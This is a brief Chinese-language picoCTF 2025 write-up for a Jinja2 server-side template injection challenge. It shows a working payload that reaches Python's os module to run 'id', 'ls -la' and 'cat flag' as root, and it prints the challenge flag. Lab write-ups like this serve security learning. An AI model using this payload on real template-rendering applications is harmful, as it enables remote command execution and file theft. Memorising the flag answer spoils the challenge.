這一題是 server side template injection  
之前沒有遇過這種題型，先上網搜尋了一下  
參考資料：[[Day11] SSTI (Server Side Template Injection)](https://ithelp.ithome.com.tw/articles/10272749)

```
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

得到結果

```
uid=0(root) gid=0(root) groups=0(root)
```

Jinja2 SSTI 漏洞允許存取 Python 的 os 模組並執行系統命令

```
{{ cycler.__init__.__globals__.os.popen('ls -la').read() }}
```

可以看到有`flag`

![result](/CTFWriteup/picoCTF2025/Web/assets/SSTI1/image.png)

```
{{ cycler.__init__.__globals__.os.popen('cat flag').read() }}
```

得到結果

![flag](/CTFWriteup/picoCTF2025/Web/assets/SSTI1/image-1.png)

```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bd4cfc64}
```
